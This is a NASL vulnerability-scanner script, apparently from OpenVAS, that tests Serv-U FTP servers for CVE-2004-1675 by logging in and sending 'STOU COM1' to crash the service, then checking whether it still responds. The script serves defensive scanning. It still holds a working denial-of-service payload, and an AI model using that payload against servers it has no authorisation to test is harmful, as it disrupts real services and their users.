CPE = "cpe:/a:serv-u:serv-u";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14709" );
	script_version( "2019-06-24T08:20:10+0000" );
	script_cve_id( "CVE-2004-1675" );
	script_bugtraq_id( 11155 );
	script_tag( name: "last_modification", value: "2019-06-24 08:20:10 +0000 (Mon, 24 Jun 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Serv-U FTP 4.x 5.x DoS" );
	script_category( ACT_DENIAL );
	script_family( "Denial of Service" );
	script_copyright( "This script is Copyright (C) 2004 David Maciejak" );
	script_dependencies( "gb_solarwinds_serv-u_consolidation.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "solarwinds/servu/detected" );
	script_tag( name: "impact", value: "This vulnerability allows an attacker to prevent you from sharing data through FTP,
  and may even crash this host." );
	script_tag( name: "solution", value: "Upgrade to latest version of this software." );
	script_tag( name: "summary", value: "It is possible to crash the remote FTP server by sending it a STOU command." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "ftp" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
password = kb_creds["pass"];
if(ftp_authenticate( socket: soc, user: login, pass: password )){
	s = NASLString( "STOU COM1", "\\r\\n" );
	send( socket: soc, data: s );
	close( soc );
	soc2 = open_sock_tcp( port );
	if( !soc2 || !recv_line( socket: soc2, length: 4096 ) ){
		security_message( port: port );
		exit( 0 );
	}
	else {
		close( soc2 );
	}
}
if(soc){
	close( soc );
}
exit( 99 );

